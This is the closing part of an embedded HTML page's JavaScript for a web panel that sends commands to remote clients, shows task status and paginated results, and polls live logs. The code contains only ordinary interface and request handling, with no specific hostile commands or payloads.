refreshDispatch();
setInterval(refreshDispatch, 3000);

function badge(status){
  const map = {pending:'待执行', sent:'已下发', done:'完成'};
  const b = document.createElement('span');
  b.className = 'badge ' + status;
  b.textContent = map[status] || status;
  return b;
}

// 命令执行结果分页:每页约 RESULT_PAGE_CHARS 字符(优先按行边界切分)
const RESULT_PAGE_CHARS = 3000;

function splitResultPages(text){
  const pages = [];
  let rest = text;
  while (rest.length > RESULT_PAGE_CHARS) {
    let cut = rest.lastIndexOf('\n', RESULT_PAGE_CHARS);
    if (cut < RESULT_PAGE_CHARS / 2) cut = RESULT_PAGE_CHARS; // 无换行或换行太靠前,硬切
    pages.push(rest.slice(0, cut + 1));
    rest = rest.slice(cut + 1);
  }
  pages.push(rest);
  return pages;
}

function mkPagerBtn(label){
  const b = document.createElement('button');
  b.className = 'mini';
  b.textContent = label;
  return b;
}

// renderResult 在指定单元格渲染任务结果,超过一页时附加翻页条
function renderResult(cell, text){
  const pages = splitResultPages(text || '');
  const pre = document.createElement('pre');
  pre.className = 'result';
  cell.appendChild(pre);
  if (pages.length <= 1) {
    pre.textContent = text || '(无输出)';
    return;
  }
  let cur = 0;
  const bar = document.createElement('div');
  bar.className = 'pager';
  const first = mkPagerBtn('«');
  const prev = mkPagerBtn('上一页');
  const info = document.createElement('span');
  info.className = 'pagerinfo';
  const next = mkPagerBtn('下一页');
  const last = mkPagerBtn('»');
  function show(){
    pre.textContent = pages[cur];
    info.textContent = (cur + 1) + ' / ' + pages.length;
    first.disabled = prev.disabled = cur === 0;
    next.disabled = last.disabled = cur === pages.length - 1;
  }
  first.onclick = () => { cur = 0; show(); };
  prev.onclick = () => { if (cur > 0) { cur--; show(); } };
  next.onclick = () => { if (cur < pages.length - 1) { cur++; show(); } };
  last.onclick = () => { cur = pages.length - 1; show(); };
  bar.append(first, prev, info, next, last);
  cell.appendChild(bar);
  show();
}

function refreshTasks(){
  if (!cur) return;
  fetch('/api/tasks?client=' + encodeURIComponent(cur)).then(r=>r.json()).then(list=>{
    const rows = document.getElementById('taskrows');
    rows.innerHTML = '';
    if (!list || !list.length) {
      rows.innerHTML = '<tr><td colspan="5" style="color:#9aa3b2">暂无任务</td></tr>';
      return;
    }
    list.forEach(t=>{
      const tr = document.createElement('tr');
      const td0 = document.createElement('td');
      td0.textContent = new Date(t.created_at*1000).toLocaleString();
      const td1 = document.createElement('td'); td1.appendChild(badge(t.status));
      const td2 = document.createElement('td'); td2.textContent = t.command;
      const td3 = document.createElement('td');
      if (t.status === 'done') {
        const out = (t.result || '') + (t.error ? '\n[错误] ' + t.error : '');
        renderResult(td3, out);
      } else if (t.status === 'sent') {
        td3.textContent = '执行中…';
      }
      const td4 = document.createElement('td');
      if (t.status !== 'done') {
        const rq = document.createElement('button');
        rq.className = 'mini'; rq.textContent = '重发';
        rq.onclick = () => taskAction(t.id, 'requeue');
        td4.appendChild(rq);
      }
      const del = document.createElement('button');
      del.className = 'mini del'; del.textContent = '删除';
      del.onclick = () => taskAction(t.id, 'delete');
      td4.appendChild(del);
      tr.append(td0, td1, td2, td3, td4);
      rows.appendChild(tr);
    });
  });
}

function taskAction(id, action){
  fetch('/api/tasks', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({id: id, action: action})
  }).then(r=>{ if (r.ok) refreshTasks(); });
}

function sendCmd(){
  const inp = document.getElementById('cmd');
  const v = inp.value.trim();
  if (!v) return;
  fetch('/api/tasks', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({client_id: cur, command: v})
  }).then(r=>{ if (r.ok) { inp.value = ''; refreshTasks(); } });
  return false;
}

if (cur) {
  document.getElementById('taskwrap').style.display = 'block';
  document.getElementById('logwrap').style.display = 'block';
  document.getElementById('tasktitle').textContent = '任务: ' + cur;
  document.getElementById('logtitle').textContent = '实时日志: ' + cur;
  const log = document.getElementById('log');
  function refreshLog(){
    fetch('/api/logs?client=' + encodeURIComponent(cur)).then(r=>r.text()).then(txt=>{
      const atBottom = log.scrollHeight - log.scrollTop - log.clientHeight < 40;
      log.textContent = txt;
      if (atBottom) log.scrollTop = log.scrollHeight;
    });
  }
  refreshLog();
  setInterval(refreshLog, 3000);
  refreshTasks();
  setInterval(refreshTasks, 3000);
  document.getElementById('cmd').addEventListener('keydown', e=>{ if (e.key==='Enter') sendCmd(); });
}
</script>
</body></html>
`
